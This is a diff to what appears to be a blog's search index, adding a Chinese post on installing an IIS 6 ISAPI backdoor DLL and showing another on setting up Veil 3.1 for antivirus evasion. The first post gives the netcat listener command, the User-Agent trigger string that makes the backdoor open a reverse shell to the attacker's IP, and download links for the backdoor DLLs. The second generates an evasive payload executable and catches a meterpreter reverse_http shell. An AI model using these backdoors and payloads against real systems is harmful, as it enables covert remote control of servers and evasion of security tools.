@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[iis6.x后门isapi测试]]></title>
+    <url>%2F2018%2F03%2F26%2Fiis6.x%E5%90%8E%E9%97%A8isapi%E6%B5%8B%E8%AF%95%2F</url>
+    <content type="text"><![CDATA[我就是爱吃醋，就是爱吃醋。 访问网页，就弹shell？唔哟本地复现了一款micropoor大牛的后门，文章结束附上下载链接。 配置环境靶机环境：IP：192.11.22.88 win 2003 Enterprise 32位 iis6.x攻击机：IP：192.11.22.55 win 7打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dlldll文件。 攻击攻击机用nc监听端口，执行命令nc.exe -lvvp 80修改User agent内容，这里以谷歌浏览器为例，点击More tools然后选中Network conditions将User agent的内容改为：micropoor_iis:192.11.22.55:80 注：填本机IP然后访问网站，成功反弹shell 强大的后门！ 链接大牛博客：micropoor.blogspot.com32位dll下载：https://drive.google.com/file/d/1-dKhidlBXg3YZ144fejY8FPaYl2KX3Ot/view64位dll下载：https://drive.google.com/file/d/1M5hh2IQsnb_sJwIAkOHIJecarcp2FDhL/view下之前挂个代理，不然访问不到。]]></content>
+      <categories>
+        <category>后门</category>
+      </categories>
+      <tags>
+        <tag>windows后门</tag>
+        <tag>iis6.x</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Veil3.1免杀安装]]></title>
     <url>%2F2018%2F03%2F23%2FVeil3.1%E5%85%8D%E6%9D%80%E5%AE%89%E8%A3%85%2F</url>
     <content type="text"><![CDATA[听说很难安装。 准备工作下载最新3.1版本的VeilGithub：https://github.com/Veil-Framework/Veil.git 配置环境安装之前先更新一下包，执行命令apt-get update下载配置Veil所需的包，不然会报错，在终端输入：apt-get install libncurses5*apt-get install libavutil55*apt-get install gcc-mingw-w64*apt-get install wine32如果下载失败就挂个代理，应该没什么问题。这里要说的是红酒瓶wine，如果安装失败就使用如下三条命令：dpkg --add-architecture i386 apt-get update apt-get install wine32 输入命令wine --version查看是否安装成功。 安装解压Veil安装包unzip Veil-master.zip，cd到Veil-master/setup目录运行./setup.sh y回车安装需要点时间，喝杯水。 紧接着，一直疯狂的按next，让它安装。这里就不一一截图了。 看到这步点击finish了,然后继续安装。安装成功 运行在Veil-master文件夹下终端输入./Veil.py运行输入use 1然后 list查看payload这里测试生成个exeuse 5，然后输入IP地址和端口这里输入要生成的文件名生成成功 测试将生成的exe丢进win7运行，然后kali运行msf开启监听set payload windows/meterpreter/reverse_httpset lhost 192.11.22.64set lport 8888run成功反弹shell整个过程大致就这样，下次见。]]></content>
